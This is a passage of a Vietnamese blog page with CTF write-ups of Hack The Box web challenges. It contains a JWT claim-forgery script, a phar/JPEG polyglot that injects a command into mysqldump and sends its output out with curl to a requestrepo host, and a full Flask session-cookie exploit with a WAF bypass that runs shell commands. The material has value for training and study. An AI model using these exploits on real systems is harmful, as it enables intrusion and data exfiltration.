+        token = &quot;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3Mjc4NDcyMTksImlhdCI6MTcyNzg0MzYxOSwianRpIjoid1NiWUFZdk1US2VmTDAzX21ETE1ndyIsIm5iZiI6MTcyNzg0MzYxOSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.DwOp49SKVRFYUMcznNCyGBCQsQl1bdBEoC5tEiM85skC-VZ_JBueuNyCdnNcnJU0ODegZBnR4IaMwbmz0EIr_Qb6cf-_w_NS-QBJuG-h_vL6m5ZI52UvCJtapUerZC7swpvqPMaQi8eYHkmfVJCB9a432cGy8wTzM7nYmPDYLia9R1K17exyjO70nfC-vN39Shq00_oAUBvx3ciLcv1k97AdGGVRaq9Cq0_rGCtKaLqTPvS0QvMqcFYZadbcVPzkNSNiUYCWy7y0rpMwHUwBykMbQgckIYB4ZQs_x8eXWT0nBqhn2Dsz7gAAbmimQzssObe6_SI49_oSLgMJfRD6Ew&quot;
+        return token
+    def topic(self, topic):
+        &quot;&quot;&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;&quot;&quot;
+        [header, payload, signature] = topic.split('.')
+        parsed_payload = loads(base64url_decode(payload))
+        print(parsed_payload)
+        parsed_payload['role'] = 'administrator'
+        parsed_payload['user'] = 'admin_user'
+        print(parsed_payload)
+        # parsed_payload['exp'] = 2000000000
+        fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
+        return '{&quot;  ' + header + '.' + fake_payload + '.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;' + header + '&quot;, &quot;payload&quot;:&quot;' + payload + '&quot;,&quot;signature&quot;:&quot;' + signature + '&quot;}'
+claime__ = ForgedClaims()
+jwt = claime__.create()
+print(claime__.topic(jwt))
+
+</code></pre><p><img src="https://hackmd.io/_uploads/HJxfQU9RA.png" alt="image"></p>
+<p>flag: <code>HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s_4t_bugg5_4nd_h4ck5}</code></p>
+<h2 id="magicom">Magicom</h2>
+<p>Một chương trình php viết theo mô hình mvc -&gt; chall cung cấp rất chi là đầy đủ các cấu hình để ta phân tích.</p>
+<p>Có thể quan sát đầy đủ các endpoint tại <code>index.php</code>:</p>
+<pre><code>&lt;?php
+
+spl_autoload_register(function ($name) {
+    $parts = explode('\\', $name);
+    $className = array_pop($parts);
+    if (preg_match('/Controller$/', $name)) {
+        $name = 'controllers/' . $name;
+    }
+
+    if (preg_match('/Model$/', $name)) {
+        $name = 'models/' . $name;
+    }
+
+    $file = $name . '.php';
+
+    if (is_file($file)) {
+        require_once $file;
+    }
+});
+
+$database = new Database('127.0.0.1', 'beluga', 'beluga', 'magicom');
+$database-&gt;connect();
+
+$router = new Router;
+
+$router-&gt;get('/', 'HomeController@index');
+$router-&gt;get('/home', 'HomeController@index');
+$router-&gt;get('/product', 'ProductViewController@index');
+$router-&gt;get('/addProduct', 'AddProductController@index');
+$router-&gt;post('/addProduct', 'AddProductController@add');
+$router-&gt;get('/info', function(){
+    return phpinfo();
+});
+
+$router-&gt;resolve();
+?&gt;
+
+</code></pre><p>có thể thấy hệ thống load các models và controller từ các package cùng cấp nằm trong các thư mục tương ứng, kết nối database</p>
+<p>Sơ qua thì sẽ có 5 endpoint mỗi ep sẽ có một controller riêng để xử lý</p>
+<p><code>/</code> và <code>/home</code> thì đều hiển thị view home
+<code>/product</code> thì hiển thị view product với thông tin của product nằm trong database.</p>
+<pre><code>public function get()
+    {
+        $result = $this-&gt;database-&gt;query('SELECT title, description, image_url FROM products');
+        $products = array();
+        
+        while ($product = $result-&gt;fetch_assoc()) {
+            $title = htmlspecialchars($product['title'], ENT_QUOTES, 'UTF-8');
+            $description = htmlspecialchars($product['description'], ENT_QUOTES, 'UTF-8');
+            $image_url = htmlspecialchars($product['image_url'], ENT_QUOTES, 'UTF-8');
+        
+            $products[] = array(
+                'title' =&gt; $title,
+                'description' =&gt; $description,
+                'image_url' =&gt; $image_url
+            );
+        }
+
+        return $products;
+    }
+</code></pre><p><code>/addProduct</code> sẽ có 2 method là get và post nếu get thì hiển thị view còn post sẽ gọi phương thức add trong model.</p>
+<pre><code>public function add() 
+    {
+        if (empty($_FILES['image']) || empty($_POST['title']) || empty($_POST['description']))
+        {
+            header('Location: /addProduct?error=1&amp;message=Fields can\'t be empty.');
+            exit;
+        }
+
+        $title = $_POST[&quot;title&quot;];
+        $description = $_POST[&quot;description&quot;];
+        $image = new ImageModel($_FILES[&quot;image&quot;]);
+
+        if($image-&gt;isValid()) {
+
+            $mimeType = mime_content_type($_FILES[&quot;image&quot;]['tmp_name']);
+            $extention = explode('/', $mimeType)[1];
+            $randomName = bin2hex(random_bytes(8));
+            $secureFilename = &quot;$randomName.$extention&quot;;
+
+            if(move_uploaded_file($_FILES[&quot;image&quot;][&quot;tmp_name&quot;], &quot;uploads/$secureFilename&quot;)) {
+                $this-&gt;product-&gt;insert($title, $description, &quot;uploads/$secureFilename&quot;);
+
+                header('Location: /addProduct?error=0&amp;message=Product added successfully.');
+                exit;
+            }
+        } else {
+            header('Location: /addProduct?error=1&amp;message=Not a valid image.');
+            exit;
+        }
+    }
+</code></pre><p>Một obj image được khởi tạo mới từ class ImageModel <code>$image = new ImageModel($_FILES[&quot;image&quot;]);</code></p>
+<pre><code>&lt;?php
+class ImageModel {
+    public function __construct($file) {
+        $this-&gt;file = $file;
+    }
+
+    public function isValid() {
+
+        $allowed_extensions = [&quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;];
+        $file_extension = pathinfo($this-&gt;file[&quot;name&quot;], PATHINFO_EXTENSION);
+        // print_r($this-&gt;file); // Delete this
+        if (!in_array($file_extension, $allowed_extensions)) {
+            return false;
+        }
+
+        $allowed_mime_types = [&quot;image/jpeg&quot;, &quot;image/jpg&quot;, &quot;image/png&quot;];
+        $mime_type = mime_content_type($this-&gt;file['tmp_name']);
+        if (!in_array($mime_type, $allowed_mime_types)) {
+            return false;
+        }
+
+        if (!getimagesize($this-&gt;file['tmp_name'])) {
+            return false;
+        }
+
+        try {
+            $imagick = new \Imagick($this-&gt;file['tmp_name']);
+            $imagick-&gt;thumbnailImage(50, 50, true, true);
+        } catch (Exception $e) {
+            return false;
+        }
+
+        return true;
+    }
+}
+?&gt;
+&lt;?php
+
+</code></pre><p>khởi tạo gán thuộc tính file check xem file có extention là jpeg, jpg, png hay không cuối cùng nếu hợp lệ thì cho qua.</p>
+<p>ta sẽ được phép upload 1 file lên và tên của nó được random với extendtion ban đầu.</p>
+<p><code>/info</code> sẽ trả cho ta thông tin của <code>phpinfo()</code></p>
+<p>Tạm thời thì ta sẽ chú ý đến đoạn upload file nhưng vẫn chưa có hướng để tìm được tên file được random.</p>
+<p>và flag nằm tại <code>COPY flag.txt /root/flag.txt</code> vậy mục tiêu của ta là rce để hoàn thành thử thách.</p>
+<p>Tất cả đã phân tích cần hết chỉ còn ngoại trừ một file cli.php</p>
+<pre><code>&lt;?php
+
+error_reporting(-1);
+
+if (!isset( $_SERVER['argv'], $_SERVER['argc'] ) || !$_SERVER['argc']) {
+    die(&quot;This script must be run from the command line!&quot;);
+}
+
+function passthruOrFail($command) {
+    passthru($command, $status);
+    if ($status) {
+        exit($status);
+    }
+}
+
+function isConfig($probableConfig) {
+    if (!$probableConfig) {
+        return null;
+    }
+    if (is_dir($probableConfig)) {
+        return isConfig($probableConfig.\DIRECTORY_SEPARATOR.'config.xml');
+    }
+
+    if (file_exists($probableConfig)) {
+        return $probableConfig;
+    }
+    if (file_exists($probableConfig.'.xml')) {
+        return $probableConfig.'.xml';
+    }
+    return null;
+};
+
+function getConfig($name) {
+
+    $configFilename = isConfig(getCommandLineValue(&quot;--config&quot;, &quot;-c&quot;));
+
+    if ($configFilename) {
+        $dbConfig = new DOMDocument();
+        $dbConfig-&gt;load($configFilename);
+
+        $var = new DOMXPath($dbConfig);
+        foreach ($var-&gt;query('/config/db[@name=&quot;'.$name.'&quot;]') as $var) {
+            return $var-&gt;getAttribute('value');
+        }
+        return null;
+    }
+    return null;
+}
+
+function getCommandLineValue($longOption, $shortOption) {
+    $argv = $_SERVER['argv'] ?? [];
+
+    $longIndex = array_search($longOption, $argv);
+    $shortIndex = array_search($shortOption, $argv);
+    $index = false;
+    $option = '';
+
+    if ($longIndex !== false) {
+        $index = $longIndex;
+        $option = $argv[$longIndex + 1] ?? null;
+    } elseif ($shortIndex !== false) {
+        $index = $shortIndex;
+        $option = $argv[$shortIndex + 1] ?? null;
+    }
+
+    return $option;
+}
+
+function generateFilename() {
+    $timestamp = date(&quot;Ymd_His&quot;);
+    $random = bin2hex(random_bytes(4));
+    $filename = &quot;backup_$timestamp&quot; . &quot;_$random.sql&quot;;
+    return $filename;
+}
+
+function backup($filename, $username, $password, $database) {
+    $backupdir = &quot;/tmp/backup/&quot;;
+    passthruOrFail(&quot;mysqldump -u$username -p$password $database &gt; $backupdir$filename&quot;);
+}
+
+function import($filename, $username, $password, $database) {
+    passthruOrFail(&quot;mysql -u$username -p$password $database &lt; $filename&quot;);
+}
+
+function healthCheck() {
+    $url = 'http://localhost:80/info';
+
+    $headers = get_headers($url);
+
+    $responseCode = intval(substr($headers[0], 9, 3));
+
+    if ($responseCode === 200) {
+        echo &quot;[+] Daijobu\n&quot;;
+    } else {
+        echo &quot;[-] Not Daijobu :(\n&quot;;
+    }
+}
+
+$username = getConfig(&quot;username&quot;);
+$password = getConfig(&quot;password&quot;);
+$database = getConfig(&quot;database&quot;);
+
+$mode = getCommandLineValue(&quot;--mode&quot;, &quot;-m&quot;);
+
+if($mode) {
+    switch ($mode) {
+        case 'import':
+            $filename = getCommandLineValue(&quot;--filename&quot;, &quot;-f&quot;);
+            if(file_exists($filename)) {
+                import($filename, $username, $password, $database);
+            } else {
+                die(&quot;No file imported!&quot;);
+            }
+            break;
+        case 'backup':
+            backup(generateFilename(), $username, $password, $database);
+            break;
+        case 'healthcheck':
+            healthcheck();
+            break;
+        default:
+            die(&quot;Unknown mode specified.&quot;);
+            break;
+        }
+}
+?&gt;
+</code></pre><p>Đầu tiên sẽ nhận các biến siêu toàn cục <code>if (!isset( $_SERVER['argv'], $_SERVER['argc'] ) || !$_SERVER['argc']) { die(&quot;This script must be run from the command line!&quot;); }</code> là argv và argc.</p>
+<p>tiếp theo gán <code>$mode = getCommandLineValue(&quot;--mode&quot;, &quot;-m&quot;);</code></p>
+<pre><code>function getCommandLineValue($longOption, $shortOption) {
+    $argv = $_SERVER['argv'] ?? [];
+
+    $longIndex = array_search($longOption, $argv);
+    $shortIndex = array_search($shortOption, $argv);
+    $index = false;
+    $option = '';
+
+    if ($longIndex !== false) {
+        $index = $longIndex;
+        $option = $argv[$longIndex + 1] ?? null;
+    } elseif ($shortIndex !== false) {
+        $index = $shortIndex;
+        $option = $argv[$shortIndex + 1] ?? null;
+    }
+
+    return $option;
+}
+</code></pre><p>ở đây sẽ nhận mảng các argv là biến siêu toàn cục</p>
+<p>nếu tồn tại sẽ check switch case nếu mode là import sẽ import một file name, nếu backup sẽ dumb một file .sql còn <code>healthcheck</code> sẽ check xem cổng 80 có hoạt động hay không.</p>
+<p>Ta phát hiện ra sink tại đây:
+<img src="https://hackmd.io/_uploads/S1Uona5J1g.png" alt="image"></p>
+<p>Cả 2 hàm đều có nguy cơ xảy ra lỗi command injection và bất kì vị trí nào như username, password, filename</p>
+<p>Tuy nhiên sau nhiều lần test thì mình thấy inject command với mysqldumb dễ dàng hơn nhiều so với mysql command -&gt; mình sẽ chọn sink tại hàm <code>backup</code></p>
+<pre><code>function backup($filename, $username, $password, $database) {
+    $backupdir = &quot;/tmp/backup/&quot;;
+    passthruOrFail(&quot;mysqldump -u$username -p$password $database &gt; $backupdir$filename&quot;);
+}
+</code></pre><p>Quan sát đối với hàm này nó sẽ nhận các tham số là $filename, $username, $password, $database.</p>
+<p>Vòng ngược lại tìm chain đến source này -&gt; như đã nói ở trên nếu mode của ta truyền vào là backup thì nó sẽ gọi đến hàm này</p>
+<p><img src="https://hackmd.io/_uploads/HySaTaqyye.png" alt="image"></p>
+<p>Tham số file name được sinh ra random cho nên ta bỏ qua vì không control được.</p>
+<p>Còn lại 3 tham số:</p>
+<p><img src="https://hackmd.io/_uploads/HyqzCTqJJe.png" alt="image"></p>
+<p>Cả 3 đều là giá trị trả ra của hàm:</p>
+<p><img src="https://hackmd.io/_uploads/HJLNRacy1l.png" alt="image"></p>
+<p>với name được truyền vào -&gt; đầu tiên nó kiểm tra:</p>
+<p><code>$configFilename = isConfig(getCommandLineValue(&quot;--config&quot;, &quot;-c&quot;));</code></p>
+<p>lấy value của option -c là viết tắt của &ndash;config -&gt; kiểm tra với hàm:</p>
+<p><img src="https://hackmd.io/_uploads/BkyRRpc1yl.png" alt="image"></p>
+<p>nếu biến không tồn tại trả về null | | nếu là thư mục thì gọi đệ quy với file <code>config.xml</code> nằm trong thư mục -&gt; nếu tồn tại file hoặc file .xml với tên đó thì trả ra còn không thì trả về null</p>
+<p>Quay lại với flow <code>configFilename</code> giá trị của biến được gán có thể là file hay file xml -&gt; nếu tồn tại tên file thì load file đó với <code>DOMDocument</code></p>
+<p><img src="https://hackmd.io/_uploads/BJIegCqkkx.png" alt="image">
+cuối cùng tả về value mà nó load được với <code>DOMXPath</code></p>
+<p>Do đó nếu file xml của ta nếu trông như thế này:</p>
+<pre><code>&lt;config&gt;
+&lt;db name=&quot;username&quot; value=&quot;root&quot;/&gt;
+&lt;db name=&quot;password&quot; value=&quot;root&quot;/&gt;
+&lt;db name=&quot;database&quot; value=&quot;&quot;/&gt;
+&lt;/config&gt;
+</code></pre><p>thì giá trị của biến 1 2 3 là value của chúng.</p>
+<p>Vậy nếu ta có thể control được value của từng trường thì có thể inject được -&gt; ta thử test trên local</p>
+<p><img src="https://hackmd.io/_uploads/rJz9gR9kke.png" alt="image"></p>
+<p>tạo một file xml và value như trên</p>
+<p>Dùng mode backup + config là file xml ta vừa tạo:</p>
+<p><img src="https://hackmd.io/_uploads/rJVJWRcyJg.png" alt="image"></p>
+<p>sau khi gửi thì flag đã được gửi oob ra domain của ta</p>
+<p><img src="https://hackmd.io/_uploads/S1E-ZC9kyx.png" alt="image"></p>
+<p>Vậy câu hỏi đặt ra là làm sao để ta có thể có được một file xml như vậy trên server.</p>
+<p>Chức năng add product cho phép ta upload một product và hiển thị ảnh với thông tin ta thêm</p>
+<p><img src="https://hackmd.io/_uploads/ryUUZA9kye.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/HJhqzRqJkx.png" alt="image"></p>
+<p>Chú ý là tên của file tại đây cũng giống với trên trong hệ thống luôn</p>
+<p><img src="https://hackmd.io/_uploads/B1SRfRq1kx.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/HJD1QR51Jl.png" alt="image"></p>
+<p>Do đó đây có thể là một điểm ta có thể lợi dụng</p>
+<p>-&gt; tiếp sau đó mình thử upload 1 file xml lên có được hay không</p>
+<p><img src="https://hackmd.io/_uploads/B1kHXCcyyg.png" alt="image"></p>
+<p>Lúc này hệ thống báo là không cho phép</p>
+<p><img src="https://hackmd.io/_uploads/rJMLXC5Jkl.png" alt="image"></p>
+<p>Bởi vì chỉ cho phép các extension như này:</p>
+<p><img src="https://hackmd.io/_uploads/H18u70ck1l.png" alt="image"></p>
+<p>Đi lục lọi trong php.ini</p>
+<p><img src="https://hackmd.io/_uploads/HklkE0qkkx.png" alt="image"></p>
+<p>ta thấy có phar có thể thực thi được</p>
+<p><img src="https://hackmd.io/_uploads/rJqVVCqykl.png" alt="image"></p>
+<p>Mình nhớ lại trước đây đã từng làm một bài upload file phar trên root-me -&gt; lục lại nó ngay, đối với bài này ta upload 1 file phar để inject code php và -&gt; RCE, nhưng bài này sẽ tìm cách phar file xml như ta muốn ở trên vào nó -&gt; sau đó nhờ wrapper phar:// để truy xuất đến file xml và nhận shell.</p>
+<p>Ta có thể đọc blog này để hiểu rõ hơn : <a href="https://blog.efiens.com/post/doublevkay/xxe-to-phar-deserialization/">https://blog.efiens.com/post/doublevkay/xxe-to-phar-deserialization/</a></p>
+<p><img src="https://hackmd.io/_uploads/HyFHBR9J1l.png" alt="image"></p>
+<p>Cơm gạo đã có bây giờ đi nấu cơm thôi:</p>
+<pre><code>&lt;?php
+    $png = &quot;\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xfe\x00\x13&quot;.
+&quot;\x43\x72\x65\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x47\x49\x4d\x50\xff\xdb\x00\x43\x00\x03\x02&quot;.
+&quot;\x02\x03\x02\x02\x03\x03\x03\x03\x04\x03\x03\x04\x05\x08\x05\x05\x04\x04\x05\x0a\x07\x07\x06\x08\x0c\x0a\x0c\x0c\x0b\x0a\x0b\x0b\x0d\x0e\x12\x10\x0d\x0e\x11\x0e\x0b\x0b\x10\x16\x10\x11\x13\x14\x15\x15&quot;.
+&quot;\x15\x0c\x0f\x17\x18\x16\x14\x18\x12\x14\x15\x14\xff\xdb\x00\x43\x01\x03\x04\x04\x05\x04\x05\x09\x05\x05\x09\x14\x0d\x0b\x0d\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14&quot;.
+&quot;\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\xff\xc2\x00\x11\x08\x00\x0a\x00\x0a\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01&quot;.
+&quot;\xff\xc4\x00\x15\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03&quot;.
+&quot;\x01\x00\x02\x10\x03\x10\x00\x00\x01\x95\x00\x07\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x05\x02\x1f\xff\xc4\x00\x14\x11&quot;.
+&quot;\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20&quot;.
+&quot;\xff\xda\x00\x08\x01\x02\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x06\x3f\x02\x1f\xff\xc4\x00\x14\x10\x01&quot;.
+&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x21\x1f\xff\xda\x00\x0c\x03\x01\x00\x02\x00\x03\x00\x00\x00\x10\x92\x4f\xff\xc4\x00\x14\x11\x01\x00&quot;.
+&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda&quot;.
+&quot;\x00\x08\x01\x02\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x10\x1f\xff\xd9&quot;;
+    $xml_data = &quot;&lt;config&gt;&lt;db name=\&quot;username\&quot; value=\&quot;|| /readflag | curl -d @- 00br69e7.requestrepo.com ||\&quot;/&gt;&lt;db name=\&quot;password\&quot; value=\&quot;root\&quot;/&gt;&lt;db name=\&quot;database\&quot; value=\&quot;\&quot;/&gt;&lt;/config&gt;&quot;;
+    $phar = new Phar(&quot;phar.phar&quot;);
+    $phar-&gt;startBuffering();
+    $phar-&gt;addFromString(&quot;a.xml&quot;, $xml_data);
+    $phar-&gt;setStub($png.&quot;__HALT_COMPILER(); ?&gt;&quot;);
+    $phar-&gt;stopBuffering();
+
+    rename('phar.phar', 'phar.png');
+?&gt;
+
+</code></pre><p>như ta đã biết phần stub này sẽ kiểm tra file có hợp lệ hay không kiểu là nó check byte đầu của file xe nó là file gì ấy, ở đây mình lấy các byte đầu của file jpeg -&gt; sau đó compress file a.xml vào nó với data rce -&gt; sau đó đưa vào file phar và đổi tên thành .png</p>
+<p>-&gt; tiến hành upload nó:</p>
+<p><img src="https://hackmd.io/_uploads/SyUMI0qykg.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/S1gQ8R9k1x.png" alt="image"></p>
+<p>ở đây thì mình đã thành công upload nó và như bạn thấy mặc dù mình để tên là .png nhưng mà upload lên nó vẫn nhận là jpeg cho thấy cấu trúc của file mình gen đã đúng</p>
+<p>giờ thì truy cập đến xml với phar:// wrapper nữa thôi</p>
+<p><img src="https://hackmd.io/_uploads/rJHtI0qyJx.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/BJBhLR51Je.png" alt="image"></p>
+<p>thành công nhận flag test -&gt; giờ thì lên server lấy flag real nữa</p>
+<p><img src="https://hackmd.io/_uploads/HyIwDRqk1g.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/r13OPAqkkx.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/B1J6PA5yJg.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/BkZAP05Jye.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/Hy_lu09kJg.png" alt="image"></p>
+<p>flag: <code>HTB{Br34k1ng_Cl1_4pps_fr0m_W3bs1t3_n0w_wh4t?}</code></p>
+<h2 id="interdimensional-internet">interdimensional internet</h2>
+<pre><code># coded by d4rkstat1c
+import requests
+from flask.sessions import SecureCookieSessionInterface
+from itsdangerous import URLSafeTimedSerializer
+
+TARGET = 'http://&lt;IP&gt;:&lt;PORT&gt;/'
+SECRET_KEY = '&lt;SECRET_KEY&gt;'
+
+# PAYLOAD = u&quot;&quot;&quot;i=().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']
+# i('flask').session['x']=i('os').popen('ls').read()&quot;&quot;&quot;
+
+PAYLOAD = u&quot;&quot;&quot;i=().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']
+i('flask').session['x']=i('os').popen('cat t*').read()&quot;&quot;&quot;
+
+class flask_encoding:
+	def __init__(self):
+		scsi = SecureCookieSessionInterface()
+		signer_kwargs = dict(
+			key_derivation=scsi.key_derivation,
+			digest_method=scsi.digest_method
+		)
+		self.serializer = URLSafeTimedSerializer(SECRET_KEY, salt=scsi.salt,
+										serializer=scsi.serializer,
+										signer_kwargs=signer_kwargs
+										)
+
+	def deserialize(self, cookie_str):
+		return self.serializer.loads(cookie_str)
+
+	def serialize(self, cookie_dict):
+		return self.serializer.dumps(cookie_dict)
+
+# waf bypass encoding
+def encode_payload(payload):
+    payload = u'&quot;a&quot;\nexec &quot;&quot;&quot;' + payload + u'&quot;&quot;&quot;'
+    blacklist = {
+    '[': '\\x5b',
+    '(': '\\x28',
+    '_': '\\x5f',
+    '.': '\\x2e'
+    }
+    for c,h in blacklist.items():
+        if c in payload:
+            payload = payload.replace(c, h)
+    return payload
+
+def modify_cookie(s):
+	f = flask_encoding()
+	cookie_dict = f.deserialize(s.cookies['session'])
+	cookie_dict['ingredient'] = u'i'
+	cookie_dict['measurements'] = encode_payload(PAYLOAD)
+	s.cookies['session'] = f.serialize(cookie_dict)
+	return s, f
+
+def exec_rce(s, f):
+	r = s.get(TARGET)
+	try:
+		enc_exfil_data = r.cookies['session']
+	except KeyError:
+		print('Exploit failed, session cookie not found!')
+		exit(1)
+	return f.deserialize(enc_exfil_data)
+
+def main():
+	s = requests.session()
+	s.get(TARGET)
+
+	s, f = modify_cookie(s)
+	exfil_data = exec_rce(s, f)
+	print(exfil_data['x'])
+
+if __name__ == '__main__':
+	main()
+</code></pre><p>flag: <code>HTB{d1d_y0u_h4v3_FuN_c4lcul4t1nG_Th3_d4rK_m4tt3r?!}</code></p>
+<h2 id="console">Console</h2>
+<p>flag: <code>HTB{PhP!Cons0lE@ByTh3K+FoUnd+}</code></p>
+
+
+        
+          <div class="blog-tags">
+            
+              
+              <a href="https://bzoltan1.github.io/tags/ctf/">CTF</a>&nbsp;
+            
+              
+              <a href="https://bzoltan1.github.io/tags/vietnamese/">Vietnamese</a>&nbsp;
+            
+          </div>
+        
+
+        
+
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://bzoltan1.github.io/write-up/2021-07-23-imaginaryctf2021/" data-toggle="tooltip" data-placement="top" title="ImaginaryCTF2021">&larr; Previous Post</a>
+            </li>
+          
+          
+            <li class="next">
+              <a href="https://bzoltan1.github.io/write-up/2024-08-22-hackthebox-web-challpart3/" data-toggle="tooltip" data-placement="top" title="Htb web chall ctf 2024 - solved challenges - part 3">Next Post &rarr;</a>
+            </li>
+          
+        </ul>
+      
+
+
+      
+
+    </div>
+  </div>
+</div>
+
+      <footer>
+  <div class="container">
+    
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            0001
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="https://gohugo.io">Hugo v0.83.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>
+
+<script src="https://bzoltan1.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://bzoltan1.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+
+
+
+    
+  </body>
+</html>
+
